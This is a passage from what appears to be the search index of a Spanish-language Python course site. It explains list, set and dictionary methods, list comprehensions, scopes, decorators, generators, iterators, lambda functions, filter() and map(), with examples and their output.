valor):"},{"location":"lenguajes/python3/Apuntes-Metodos/#pop","text":"Extrae un \u00edtem de la lista y lo borra l = [ 10 , 20 , 30 , 40 , 50 ] l . pop () 50 print ( l ) [10, 20, 30, 40] Podemos indicarle un \u00edndice con el elemento a sacar (0 es el primer \u00edtem) l . pop ( 0 ) 10 print ( l ) [20, 30, 40]","title":"pop():"},{"location":"lenguajes/python3/Apuntes-Metodos/#remove","text":"Borra un \u00edtem de la lista directamente a partir del \u00edndice l . remove ( 30 ) print ( l ) [20, 40] l = [ 20 , 30 , 30 , 30 , 40 ] l . remove ( 30 ) print ( l ) [20, 30, 30, 40]","title":"remove():"},{"location":"lenguajes/python3/Apuntes-Metodos/#reverse","text":"Le da la vuelta a la lista actual l . reverse () print ( l ) [40, 30, 30, 20] Las cadenas no tienen el m\u00e9todo .reverse() pero podemos simularlo haciendo unas conversiones... \"Hola mundo\" . reverse () --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-58-eb5308f434bf> in <module>() ----> 1 \"Hola mundo\".reverse() AttributeError: 'str' object has no attribute 'reverse' lista = list ( \"Hola mundo\" ) lista ['H', 'o', 'l', 'a', ' ', 'm', 'u', 'n', 'd', 'o'] lista . reverse () lista ['o', 'd', 'n', 'u', 'm', ' ', 'a', 'l', 'o', 'H'] cadena = \"\" . join ( lista ) cadena 'odnum aloH'","title":"reverse():"},{"location":"lenguajes/python3/Apuntes-Metodos/#sort","text":"Ordena autom\u00e1ticamente los \u00edtems de una lista por su valor de menor a mayor lista = [ 5 , - 10 , 35 , 0 , - 65 , 100 ] lista . sort () lista [-65, -10, 0, 5, 35, 100] Podemos utilizar el argumento reverse=True para indicar que la ordene del rev\u00e9s lista . sort ( reverse = True ) lista [100, 35, 5, 0, -10, -65]","title":"sort():"},{"location":"lenguajes/python3/Apuntes-Metodos/#metodos-de-los-conjuntos","text":"c = set ()","title":"M\u00e9todos de los conjuntos"},{"location":"lenguajes/python3/Apuntes-Metodos/#add","text":"A\u00f1ade un \u00edtem a un conjunto, si ya existe no lo a\u00f1ade c . add ( 1 ) c . add ( 2 ) c . add ( 3 ) print ( c ) {1, 2, 3}","title":"add():"},{"location":"lenguajes/python3/Apuntes-Metodos/#discard","text":"Borra un \u00edtem de un conjunto c . discard ( 1 ) print ( c ) {2, 3} Cuando creas una copia realmente es un enlace directo c . add ( 1 ) c2 = c c2 . add ( 4 ) print ( c ) {1, 2, 3, 4}","title":"discard():"},{"location":"lenguajes/python3/Apuntes-Metodos/#copy","text":"Crea una copia de un conjunto Recordad que los tipos compuestos no se pueden copiar, son como accesos directos por referencia c2 = c . copy () print ( c2 ) {1, 2, 3, 4} print ( c ) {1, 2, 3, 4} c2 . discard ( 4 ) print ( c2 ) {1, 2, 3} print ( c ) {1, 2, 3, 4}","title":"copy():"},{"location":"lenguajes/python3/Apuntes-Metodos/#clear_1","text":"Borra todos los \u00edtems de un conjunto c2 . clear () c2 set()","title":"clear():"},{"location":"lenguajes/python3/Apuntes-Metodos/#comparacion-de-conjuntos","text":"c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 }","title":"Comparaci\u00f3n de conjuntos"},{"location":"lenguajes/python3/Apuntes-Metodos/#isdisjoint","text":"Comprueba si el conjunto es disjunto de otro conjunto Si no hay ning\u00fan elemento en com\u00fan entre ellos c1 . isdisjoint ( c2 ) False","title":"isdisjoint():"},{"location":"lenguajes/python3/Apuntes-Metodos/#issubset","text":"Comprueba si el conjunto es subconjunto de otro conjunto Si sus \u00edtems se encuentran todos dentro de otro c3 . issubset ( c4 ) False","title":"issubset():"},{"location":"lenguajes/python3/Apuntes-Metodos/#issuperset","text":"Comprueba si el conjunto es contenedor de otro subconjunto Si contiene todos los \u00edtems de otro c3 . issuperset ( c1 ) False","title":"issuperset():"},{"location":"lenguajes/python3/Apuntes-Metodos/#metodos-avanzados","text":"Se utilizan para realizar uniones, diferencias y otras operaciones avanzadas entre conjuntos. Suelen tener dos formas, la normal que devuelve el resultado, y otra que hace lo mismo pero actualiza el propio resultado. c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 }","title":"M\u00e9todos avanzados"},{"location":"lenguajes/python3/Apuntes-Metodos/#union","text":"Une un conjunto a otro y devuelve el resultado en un nuevo conjunto c1 . union ( c2 ) == c4 True c1 . union ( c2 ) {1, 2, 3, 4, 5} print ( c1 ) {1, 2, 3} print ( c2 ) {3, 4, 5}","title":"union():"},{"location":"lenguajes/python3/Apuntes-Metodos/#update","text":"Une un conjunto a otro en el propio conjunto c1 . update ( c2 ) print ( c1 ) {1, 2, 3, 4, 5}","title":"update():"},{"location":"lenguajes/python3/Apuntes-Metodos/#difference","text":"Encuentra los elementos no comunes entre dos conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } c1 . difference ( c2 ) {1, 2}","title":"difference():"},{"location":"lenguajes/python3/Apuntes-Metodos/#difference_update","text":"Guarda en el conjunto los elementos no comunes entre dos conjuntos c1 . difference_update ( c2 ) print ( c1 ) {1, 2}","title":"difference_update():"},{"location":"lenguajes/python3/Apuntes-Metodos/#intersection","text":"Devuelve un conjunto con los elementos comunes en dos conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } c1 . intersection ( c2 ) {3}","title":"intersection():"},{"location":"lenguajes/python3/Apuntes-Metodos/#intersection_update","text":"Guarda en el conjunto los elementos comunes entre dos conjuntos c1 . intersection_update ( c2 ) c1 {3}","title":"intersection_update():"},{"location":"lenguajes/python3/Apuntes-Metodos/#symmetric_difference","text":"Devuelve los elementos sim\u00e9tricamente diferentes entre dos conjuntos Todos los elementos que no concuerdan entre los dos conjuntos c1 = { 1 , 2 , 3 } c2 = { 3 , 4 , 5 } c3 = { - 1 , 99 } c4 = { 1 , 2 , 3 , 4 , 5 } c1 . symmetric_difference ( c2 ) {1, 2, 4, 5}","title":"symmetric_difference():"},{"location":"lenguajes/python3/Apuntes-Metodos/#metodos-de-los-diccionarios","text":"colores = { \"amarillo\" : \"yellow\" , \"azul\" : \"blue\" , \"verde\" : \"green\" } colores [ 'amarillo' ] 'yellow'","title":"M\u00e9todos de los diccionarios"},{"location":"lenguajes/python3/Apuntes-Metodos/#get","text":"Busca un elemento a partir de su clave y si no lo encuentra devuelve un valor por defecto colores . get ( 'negro' , 'no se encuentra' ) 'no se encuentra' 'amarillo' in colores True","title":"get():"},{"location":"lenguajes/python3/Apuntes-Metodos/#keys","text":"Genera una lista en clave de los registros del diccionario colores . keys () dict_keys(['amarillo', 'azul', 'verde'])","title":"keys():"},{"location":"lenguajes/python3/Apuntes-Metodos/#values","text":"Genera una lista en valor de los registros del diccionario colores . values () dict_values(['yellow', 'blue', 'green'])","title":"values():"},{"location":"lenguajes/python3/Apuntes-Metodos/#items","text":"Genera una lista en clave-valor de los registros del diccionario colores . items () dict_items([('amarillo', 'yellow'), ('azul', 'blue'), ('verde', 'green')]) for c in colores : print ( colores [ c ]) yellow blue green for c , v in colores . items (): print ( c , v ) # clave, valor amarillo yellow azul blue verde green","title":"items():"},{"location":"lenguajes/python3/Apuntes-Metodos/#pop_1","text":"Extrae un registro de un diccionario a partir de su clave y lo borra, acepta valor por defecto colores . pop ( \"amarillo\" , \"no se ha encontrado\" ) 'yellow' print ( colores ) {'azul': 'blue', 'verde': 'green'} colores . pop ( \"negro\" , \"no se ha encontrado\" ) 'no se ha encontrado' print ( colores ) {'azul': 'blue', 'verde': 'green'}","title":"pop():"},{"location":"lenguajes/python3/Apuntes-Metodos/#clear_2","text":"Borra todos los registros de un diccionario colores . clear () print ( colores ) {}","title":"clear():"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/","text":"Compresi\u00f3n de listas La compresi\u00f3n de listas es una manera r\u00e1pida de crear una lista en una sola l\u00ednea de c\u00f3digo. compresi\u00f3n simple Crear una lista de una cadena de caracteres # metodo tradicional lista = [] for letra in 'casa' : lista . append ( letra ) print ( lista ) ['c', 'a', 's', 'a'] # m\u00e9todo con compresi\u00f3n lista = [ letra for letra in 'casa' ] print ( lista ) ['c', 'a', 's', 'a'] compresi\u00f3n con condici\u00f3n M\u00faltiples de 2 del 0 al 10 # metodo tradicional lista = [] for numero in range ( 0 , 11 ): lista . append ( numero ** 2 ) print ( lista ) [0, 1, 4, 9, 16, 25, 36, 49, 64, 81, 100] # compresion lista = [ numero ** 2 for numero in range ( 0 , 11 )] print ( lista ) [0, 1, 4, 9, 16, 25, 36, 49, 64, 81, 100] n\u00fameros pares del 0 al 10 # metodo tradicional lista = [] for numero in range ( 0 , 11 ): if numero % 2 == 0 : lista . append ( numero ) print ( lista ) [0, 2, 4, 6, 8, 10] # compresion lista = [ numero for numero in range ( 0 , 11 ) if numero % 2 == 0 ] print ( lista ) [0, 2, 4, 6, 8, 10] compresi\u00f3n m\u00faltiple lista de n\u00fameros pares del 0 al 10 potenciados por 2 # metodo tradicional lista = [] for numero in range ( 0 , 11 ): lista . append ( numero ** 2 ) pares = [] for numero in lista : if numero % 2 == 0 : pares . append ( numero ) print ( pares ) [0, 4, 16, 36, 64, 100] # compresion pares = [ numero for numero in [ numero ** 2 for numero in range ( 0 , 11 )] if numero % 2 == 0 ] print ( pares ) [0, 4, 16, 36, 64, 100] \u00c1mbitos y funciones decoradoras Introducci\u00f3n No cabe duda de que Python es un lenguaje flexible, y cuando trabajamos con funciones no es una excepci\u00f3n. En Python, dentro de una funci\u00f3n podemos definir otras funciones. Con la peculiaridad de que el \u00e1mbito de estas funciones se encuentre \u00fanicamente dentro de la funci\u00f3n padre. Vamos a trabajar los \u00e1mbitos un poco m\u00e1s en profundidad: def hola (): def bienvenido (): return \"Hola!\" return bienvenido Si intentamos llamar a la funci\u00f3n bienvenido... bienvenido () --------------------------------------------------------------------------- NameError Traceback (most recent call last) <ipython-input-3-f083d151b813> in <module>() ----> 1 bienvenido() NameError: name 'bienvenido' is not defined Como vemos nos da un error de que no existe. En cambio si intentamos ejecutar la funci\u00f3n hola() : hola () <function __main__.hola.<locals>.bienvenido> Se devuelve la funci\u00f3n bienvenido, y podemos apreciar dentro de su definici\u00f3n que existe un espacio llamado locals , el cual hace referencia al \u00e1mbito local que abarca la funci\u00f3n. \u00c1mbito local y global Si utilizamos una funci\u00f3n reservada locals() obtendremos un diccionario con todas las definiciones dentro del espacio local del bloque en el que estamos: def hola (): def bienvenido (): return \"Hola!\" print ( locals () ) # Mostramos el \u00e1mbito local hola () {'bienvenido': <function hola.<locals>.bienvenido at 0x000001F867E88C80>} Como vemos se nos muestra un diccionario, aqu\u00ed encontraremos la funci\u00f3n bienvenido() . Podr\u00edamos a\u00f1adir algo m\u00e1s: lista = [ 1 , 2 , 3 ] def hola (): numero = 50 def bienvenido (): return \"Hola!\" print ( locals () ) # Mostramos el \u00e1mbito local hola () {'bienvenido': <function hola.<locals>.bienvenido at 0x000001F867E88950>, 'numero': 50} Como podemos observar, ahora adem\u00e1s de la funci\u00f3n tenemos una clave con el n\u00famero y el valor 50. Sin embargo no encontramos la lista, pues esta se encuentra fuera del \u00e1mbito local. De hecho se encuentra en el \u00e1mbito global, el cual podemos mostrar con la funci\u00f3n reservada globals() : # Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria. lista = [ 1 , 2 , 3 ] def hola (): numero = 50 def bienvenido (): return \"Hola!\" print ( globals () ) # Mostramos el \u00e1mbito global hola () {'__name__': '__main__', '_oh': {}, '__doc__': 'Automatically created module for IPython interactive environment', 'lista': [1, 2, 3], '__builtin__': <module 'builtins' (built-in)>, 'In': ['', '# Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria.\\nlista = [1,2,3]\\n\\ndef hola():\\n \\n numero = 50\\n \\n def bienvenido():\\n return \"Hola!\"\\n \\n print( globals() ) # Mostramos el \u00e1mbito global\\n\\nhola()'], '_ih': ['', '# Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria.\\nlista = [1,2,3]\\n\\ndef hola():\\n \\n numero = 50\\n \\n def bienvenido():\\n return \"Hola!\"\\n \\n print( globals() ) # Mostramos el \u00e1mbito global\\n\\nhola()'], '__loader__': None, '__builtins__': <module 'builtins' (built-in)>, '_dh': ['C:\\\\CursoPython\\\\Fase 4 - Temas avanzados\\\\Tema 15 - Funcionalidades avanzadas\\\\Apuntes'], 'get_ipython': <bound method InteractiveShell.get_ipython of <ipykernel.zmqshell.ZMQInteractiveShell object at 0x00000243D11F5E80>>, 'hola': <function hola at 0x00000243D1B58C80>, '_sh': <module 'IPython.core.shadowns' from 'C:\\\\Users\\\\Hector\\\\Anaconda3\\\\lib\\\\site-packages\\\\IPython\\\\core\\\\shadowns.py'>, '_': '', '_ii': '', 'Out': {}, '__package__': None, '___': '', '_iii': '', '_i': '', '__spec__': None, 'exit': <IPython.core.autocall.ZMQExitAutocall object at 0x00000243D1A92B70>, 'quit': <IPython.core.autocall.ZMQExitAutocall object at 0x00000243D1A92B70>, '_i1': '# Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria.\\nlista = [1,2,3]\\n\\ndef hola():\\n \\n numero = 50\\n \\n def bienvenido():\\n return \"Hola!\"\\n \\n print( globals() ) # Mostramos el \u00e1mbito global\\n\\nhola()', '__': ''} Tampoco es necesario que nos paremos a analizar el contenido, pero como podemos observar, desde el \u00e1mbito global tenemos acceso a muchas m\u00e1s definiciones porque engloba a su vez todas las de sus bloques padres. Si mostramos \u00fanicamente las claves del diccionario globals() , quiz\u00e1 ser\u00eda m\u00e1s entendible: globals () . keys () dict_keys(['_i4', '__name__', '_oh', '__doc__', 'lista', '__builtin__', 'In', '_i5', '_ih', '__loader__', '__builtins__', '_dh', 'get_ipython', 'hola', '_sh', '_', '_ii', 'Out', '__package__', '___', '_iii', '_i', '__spec__', 'exit', '_i3', 'quit', '_i1', '_i2', '__']) Ahora si buscamos bien encontraremos la clave lista , la cual hace referencia a la variable declarada fuera de la funci\u00f3n. Incluso podr\u00edamos acceder a ella como si fuera un diccionario normal: globals ()[ 'lista' ] # Desde la funci\u00f3n globals [1, 2, 3] lista # Forma tradicional [1, 2, 3] Funciones como variables Volviendo a nuestra funci\u00f3n hola() , ahora sabemos que si la ejecutamos, en realidad estamos accediendo a su funci\u00f3n local bienvenido() , pero eso no significa que la ejecutamos, s\u00f3lo estamos haciendo referencia a ella. Esa es la raz\u00f3n de que se devuelva su definici\u00f3n y no el resultado de su ejecuci\u00f3n: def hola (): def bienvenido (): return \"Hola!\" return bienvenido hola () <function __main__.hola.<locals>.bienvenido> Por muy raro que parezca, podr\u00edamos ejecutarla llamando una segunda vez al par\u00e9ntesis. La primera para hola() y la segunda para bienvenido() : hola ()() 'Hola!' Como es realmente extra\u00f1o, normalmente lo que hacemos es asignar la funci\u00f3n a una variable y ejecutarla como si fuera una nueva funci\u00f3n: bienvenido = hola () bienvenido () 'Hola!' A diferencia de las colecciones y los objetos, donde las copias se utilizaban como accesos directos, las copias de las funciones son independientes y aunque borr\u00e1semos la original, la nueva copia seguir\u00eda existiendo: del ( hola ) bienvenido () 'Hola!' Funciones como argumentos Si ya era extra\u00f1o ejecutar funciones anidadas, todav\u00eda es m\u00e1s extra\u00f1o el concepto de enviar una funci\u00f3n como argumento de otra funci\u00f3n, sin embargo gracias a la flexibilidad de Python es posible hacerlo: def hola (): return \"Hola Mundo!\" def test ( funcion ): print ( funcion () ) test ( hola ) Hola Mundo! Quiz\u00e1 en este momento no se ocurren muchas utilidades para esta funcionalidad, pero creedme que es realmente \u00fatil cuando queremos extender funciones ya existentes sin modificarlas. De ah\u00ed que este proceso se conozca como un decorador, y de ah\u00ed pasamos directamente a las funciones decoradoras. Funciones decoradoras Una funci\u00f3n decoradora es una funci\u00f3n que envuelve la ejecuci\u00f3n de otra funci\u00f3n y permite extender su comportamiento. Est\u00e1n pensadas para reutilazarlas gracias a una sintaxis de ejecuci\u00f3n mucho m\u00e1s simple. Imaginaros estas dos funciones sencillas: def hola (): print ( \"Hola!\" ) def adios (): print ( \"Adi\u00f3s!\" ) Y queremos queremos crear un decorador para monitorizar cuando se ejecutan las dos funciones, avisando antes y despu\u00e9s. Para crear una funci\u00f3n decoradora tenemos que recibir la funci\u00f3n a ejecutar, y envolver su ejecuci\u00f3n con el c\u00f3digo a extender: def monitorizar ( funcion ): def decorar (): print ( \" \\t * Se est\u00e1 apunto de ejecutar la funci\u00f3n:\" , funcion . __name__ ) funcion () print ( \" \\t * Se ha finalizado de ejecutar la funci\u00f3n:\" , funcion . __name__ ) return decorar Ahora para realizar la monitorizaci\u00f3n deber\u00edamos llamar al monitor ejecutando la funci\u00f3n enviada y devuelta: monitorizar ( hola )() * Se est\u00e1 apunto de ejecutar la funci\u00f3n: hola Hola! * Se ha finalizado de ejecutar la funci\u00f3n: hola Sin embargo esto no es muy c\u00f3modo, y ah\u00ed es cuando aparece la sintaxis que nos permite configurar una funci\u00f3n decoradora en una funci\u00f3n normal: @monitorizar def hola (): print ( \"Hola!\" ) @monitorizar def adios (): print ( \"Adi\u00f3s!\" ) Una vez configurada la funci\u00f3n decoradora, al utilizar las funciones se ejecutar\u00e1n autom\u00e1ticamente dentro de la funci\u00f3n decoradora: hola () print () adios () * Se est\u00e1 apunto de ejecutar la funci\u00f3n: hola Hola! * Se ha finalizado de ejecutar la funci\u00f3n: hola * Se est\u00e1 apunto de ejecutar la funci\u00f3n: adios Adi\u00f3s! * Se ha finalizado de ejecutar la funci\u00f3n: adios Pasando argumentos al decorador def monitorizar_args ( funcion ): def decorar ( * args , ** kwargs ): print ( \" \\t * Se est\u00e1 apunto de ejecutar la funci\u00f3n:\" , funcion . __name__ ) funcion ( * args , ** kwargs ) print ( \" \\t * Se ha finalizado de ejecutar la funci\u00f3n:\" , funcion . __name__ ) return decorar @monitorizar_args def hola ( nombre ): print ( \"Hola {} !\" . format ( nombre )) @monitorizar_args def adios ( nombre ): print ( \"Adi\u00f3s {} !\" . format ( nombre )) hola ( \"H\u00e9ctor\" ) print () adios ( \"H\u00e9ctor\" ) * Se est\u00e1 apunto de ejecutar la funci\u00f3n: hola Hola H\u00e9ctor! * Se ha finalizado de ejecutar la funci\u00f3n: hola * Se est\u00e1 apunto de ejecutar la funci\u00f3n: adios Adi\u00f3s H\u00e9ctor! * Se ha finalizado de ejecutar la funci\u00f3n: adios Perfecto! Ahora ya sabes qu\u00e9 son las funciones decoradoras y c\u00f3mo utilizar el s\u00edmbolo @ para automatizar su ejecuci\u00f3n. Estas funciones se utilizan mucho cuando trabajamos con Frameworks Web como Django, as\u00ed que seguro te har\u00e1n servicio si tienes pensado aprender a utilizarlo. Funciones generadoras Por regla general, cuando queremos crear una lista de alg\u00fan tipo, lo que hacemos es crear la lista vac\u00eda, y luego con un bucle varios elementos e ir a\u00f1adiendolos a la lista si cumplen una condici\u00f3n: [ numero for numero in [ 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] if numero % 2 == 0 ] [0, 2, 4, 6, 8, 10] Tambi\u00e9n vimos c\u00f3mo era posible utilizar la funci\u00f3n range() para generar din\u00e1micamente la lista en la memoria, es decir, no ten\u00edamos que crearla en el propio c\u00f3digo, sino que se interpretaba sobre la marcha: [ numero for numero in range ( 0 , 11 ) if numero % 2 == 0 ] [0, 2, 4, 6, 8, 10] La verdad es que range() es una especie de funci\u00f3n generadora. Por regla general las funciones devolvuelven un valor con return , pero la preculiaridad de los generadores es que van cediendo valores sobre la marcha, en tiempo de ejecuci\u00f3n. La funci\u00f3n generadora range(0,11) , empieza cediendo el 0 , luego se procesa el for comprobando si es par y lo a\u00f1ade a la lista, en la siguiente iteraci\u00f3n se cede el 1 , se procesa el for se comprueba si es par, en la siguiente se cede el 2 , etc. Con esto se logra ocupar el m\u00ednimo de espacio en la memoria y podemos generar listas de millones de elementos sin necesidad de almacenarlos previamente. Veamos a ver c\u00f3mo crear una funci\u00f3n generadora de pares: def pares ( n ): for numero in range ( n + 1 ): if numero % 2 == 0 : yield numero pares ( 10 ) <generator object pares at 0x000002945F38BFC0> Como vemos, en lugar de utilizar el return , la funci\u00f3n generadora utiliza el yield , que significa ceder. Tomando un n\u00famero busca todos los pares desde 0 hasta el n\u00famero+1 sirvi\u00e9ndonos de un range(). Sin embargo, fijaros que al imprimir el resultado, \u00e9ste nos devuelve un objeto de tipo generador. De la misma forma que recorremos un range() podemos utilizar el bucle for para recorrer todos los elementos que devuelve el generador: for numero in pares ( 10 ): print ( numero ) 0 2 4 6 8 10 Utilizando comprensi\u00f3n de listas tambi\u00e9n podemos crear una lista al vuelo: [ numero for numero in pares ( 10 )] [0, 2, 4, 6, 8, 10] Sin embargo el gran potencial de los generadores no es simplemente crear listas, de hecho como ya hemos visto, el propio resultado no es una lista en s\u00ed mismo, sino una secuencia iterable con un mont\u00f3n de caracter\u00edsticas \u00fanicas. Iteradores Por tanto las funciones generadoras devuelven un objeto que suporta un protocolo de iteraci\u00f3n. \u00bfQu\u00e9 nos permite hacer? Pues evidentemente controlar el proceso de generaci\u00f3n. Teniendo en cuenta que cada vez que la funci\u00f3n generadora cede un elemento, queda suspendida y se retoma el control hasta que se le pide generar el siguiente valor. As\u00ed que vamos a tomar nuestro ejemplo de pares desde otra perspectiva, como si fuera un iterador manual, as\u00ed veremos exactamente a lo que me refiero: pares = pares ( 3 ) Bien, ahora tenemos un iterador de pares con todos los n\u00fameros pares entre el 0 y el 3. Vamos a conseguir el primer n\u00famero par: next ( pares ) 0 Como vemos la funci\u00f3n integrada next() nos permite acceder al siguiente elemento de la secuencia. Pero no s\u00f3lo eso, si volvemos a ejecutarla... next ( pares ) 2 Ahora devuelve el segundo! \u00bfNo os recuerdo esto al puntero de los ficheros? Cuando le\u00edamos una l\u00ednea, el puntero pasaba a la siguiente y as\u00ed sucesivamente. Pues aqu\u00ed igual. \u00bfY qu\u00e9 pasar\u00eda si intentamos acceder al siguiente, a\u00fan sabiendo que entre el 0 y el 3 s\u00f3lo tenemos los pares 0 y 2? next ( pares ) --------------------------------------------------------------------------- StopIteration Traceback (most recent call last) <ipython-input-34-68378216ba43> in <module>() ----> 1 next(pares) StopIteration: Pues que nos da un error porque se ha acabado la secuencia, as\u00ed que tomad nota y capturad la excepci\u00f3n si v\u00e1is a utilizarlas sin saber exactamente cuantos elementos os devolver\u00e1 el generador. As\u00ed que la pregunta que nos queda es \u00bfs\u00f3lo es posible iterar secuencias generadas al vuelo? Vamos a probar con una lista: lista = [ 1 , 2 , 3 , 4 , 5 ] next ( lista ) --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-38-28c22b67c419> in <module>() 1 lista = [1,2,3,4,5] ----> 2 next(lista) 3 4 cadena = \"Hola\" 5 next(cadena) TypeError: 'list' object is not an iterator \u00bfQuiz\u00e1 con una cadena? cadena = \"Hola\" next ( cadena ) --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-39-44ca9ed1903b> in <module>() 1 cadena = \"Hola\" ----> 2 next(cadena) TypeError: 'str' object is not an iterator Pues no, no podemos iterar ninguna colecci\u00f3n como si fuera una secuencia. Sin embargo, hay una funci\u00f3n muy interesante que nos permite covertir las cadenas y algunas colecciones a iteradores, la funci\u00f3n iter() : lista = [ 1 , 2 , 3 , 4 , 5 ] lista_iterable = iter ( lista ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) 1 2 3 4 5 cadena = \"Hola\" cadena_iterable = iter ( cadena ) print ( next ( cadena_iterable ) ) print ( next ( cadena_iterable ) ) print ( next ( cadena_iterable ) ) print ( next ( cadena_iterable ) ) H o l a Muy bien, ahora ya sabemos qu\u00e9 son las funciones generadores, c\u00f3mo utilizarlas, y tambi\u00e9n como como convertir algunos objetos a iteradores. Os sugiero probar por vuestra cuenta m\u00e1s colecciones a ver si encontr\u00e1is alguna m\u00e1s que se pueda iterar. Funciones Lambda Si empiezo diciendo que las funciones o expresiones lambda sirven para crear funciones an\u00f3nimas, posiblemente me dir\u00e9is \u00bfqu\u00e9 me est\u00e1s contando?, as\u00ed que vamos a tomarlo con calma, pues estamos ante unas de las funcionalidades m\u00e1s potentes de Python a la vez que m\u00e1s confusas para los principiantes. Una funci\u00f3n an\u00f3nima, como su nombre indica es una funci\u00f3n sin nombre. \u00bfEs posible ejecutar una funci\u00f3n sin referenciar un nombre? Pues s\u00ed, en Python podemos ejecutar una funci\u00f3n sin definirla con def . De hecho son similares pero con una diferencia fundamental: El contenido de una funci\u00f3n lambda debe ser una \u00fanica expresi\u00f3n en lugar de un bloque de acciones. Y es que m\u00e1s all\u00e1 del sentido de funci\u00f3n que tenemos, con su nombre y sus acciones internas, una funci\u00f3n en su sentido m\u00e1s trivial significa realizar algo sobre algo. Por tanto podr\u00edamos decir que, mientras las funciones an\u00f3nimas lambda sirven para realizar funciones simples, las funciones definidas con def sirven para manejar tareas m\u00e1s extensas. Si deconstruimos una funci\u00f3n sencilla, podemos llegar a una funci\u00f3n lambda. Por ejemplo tomad la siguiente funci\u00f3n para doblar un valor: def doblar ( num ): resultado = num * 2 return resultado doblar ( 2 ) 4 Vamos a simplificar el c\u00f3digo lo m\u00e1ximo posible: def doblar ( num ): return num * 2 Todav\u00eda m\u00e1s, podemos escribirlo todo en una sola l\u00ednea: def doblar ( num ): return num * 2 Esta notaci\u00f3n simple es la que una funci\u00f3n lambda intenta replicar, fijaros, vamos a convertir la funci\u00f3n en una funci\u00f3n an\u00f3nima: lambda num : num * 2 <function __main__.<lambda>> \u00a1Hual\u00e1! Aqu\u00ed tenemos una funci\u00f3n an\u00f3nima con una entrada que recibe num , y una salida que devuelve num * 2 . Lo \u00fanico que necesitamos hacer para utilizarla es guardarla en una variable y utilizarla tal como har\u00edamos con una funci\u00f3n normal: doblar = lambda num : num * 2 doblar ( 2 ) 4 Gracias a la flexibilidad de Python podemos implementar infinitas funciones simples. Por ejemplo comprobar si un n\u00famero es impar: impar = lambda num : num % 2 != 0 impar ( 5 ) True Darle la vuelta a una cadena utilizando slicing: revertir = lambda cadena : cadena [:: - 1 ] revertir ( \"Hola\" ) 'aloH' Incluso podemos enviar varios valores, por ejemplo para sumar dos n\u00fameros: sumar = lambda x , y : x + y sumar ( 5 , 2 ) 7 Como v\u00e9is podemos realizar cualquier cosa que se nos ocurra, siempre que lo podamos definir en una sola expresi\u00f3n. Por ahora lo dejamos aqu\u00ed, pero en las pr\u00f3ximas lecciones veremos como utilizar la funci\u00f3n lambda en conjunto con otras funciones como filter() y map() , que es cuando sale a relucir su verdadero potencial. Funci\u00f3n filter() Tal como su nombre indica filter significa filtrar, y es una de mis funciones favoritas, ya que a partir de una lista o iterador, y una funci\u00f3n condicional, es capaz de devolver una nueva colecci\u00f3n con los elementos filtrados que cumplan la condici\u00f3n. Por ejemplo, supongamos que tenemos una lista varios n\u00fameros y queremos filtrarla, qued\u00e1ndonos \u00fanicamente con los m\u00faltiples de 5... def multiple ( numero ): # Primero declaramos una funci\u00f3n condicional if numero % 5 == 0 : # Comprobamos si un numero es m\u00faltiple de cinco return True # S\u00f3lo devolvemos True si lo es numeros = [ 2 , 5 , 10 , 23 , 50 , 33 ] filter ( multiple , numeros ) <filter at 0x257ac84abe0> Si ejecutamos el filtro obtenemos un objeto de tipo filtro, pero podemos transformarlo en una lista f\u00e1cilmente haciendo un cast: list ( filter ( multiple , numeros ) ) [5, 10, 50] Por tanto cuando utilizamos la funci\u00f3n filter() tenemos que enviar una funci\u00f3n condicional, pero como recordar\u00e9is, no es necesario definirla, podemos utlizar una funci\u00f3n an\u00f3nima lambda: list ( filter ( lambda numero : numero % 5 == 0 , numeros ) ) [5, 10, 50] As\u00ed, en una sola l\u00ednea hemos definido y ejecutado el filtro utilizando una funci\u00f3n condicional an\u00f3nima y una lista de numeros. Filtrando objetos Sin embargo, para m\u00ed, m\u00e1s all\u00e1 de filtrar listas con valores simples, el verdadero potencial de filter() sale a relucir cuando necesitamos filtrar varios objetos de una lista. Por ejemplo, dada una lista con varias personas, nos gustar\u00eda filtrar \u00fanicamente las que son menores de edad: class Persona : def __init__ ( self , nombre , edad ): self . nombre = nombre self . edad = edad def __str__ ( self ): return \" {} de {} a\u00f1os\" . format ( self . nombre , self . edad ) personas = [ Persona ( \"Juan\" , 35 ), Persona ( \"Marta\" , 16 ), Persona ( \"Manuel\" , 78 ), Persona ( \"Eduardo\" , 12 ) ] Para hacerlo nos vamos a servir de una funci\u00f3n lambda, comprobando el campo edad para cada persona: menores = filter ( lambda persona : persona . edad < 18 , personas ) for menor in menores : print ( menor ) Marta de 16 a\u00f1os Eduardo de 12 a\u00f1os S\u00e9 que es un ejemplo sencillo, pero estoy seguro que os puede servir como base para realizar filtrados en muchos de vuestros proyectos. Funci\u00f3n map() Esta funci\u00f3n trabaja de una forma muy similar a filter() , con la diferencia que en lugar de aplicar una condici\u00f3n a un elemento de una lista o secuencia, aplica una funci\u00f3n sobre todos los elementos y como resultado se devuelve un iterable de tipo map: def doblar ( numero ): return numero * 2 numeros = [ 2 , 5 , 10 , 23 , 50 , 33 ] map ( doblar , numeros ) <map at 0x212eb6e0748> F\u00e1cilmente podemos transformar este iterable en una lista: list ( map ( doblar , numeros )) [4, 10, 20, 46, 100, 66] Y podemos simplificarlo con una funci\u00f3n lambda para substituir la llamada de una funci\u00f3n definida: list ( map ( lambda x : x * 2 , numeros ) ) [4, 10, 20, 46, 100, 66] La funci\u00f3n map() se 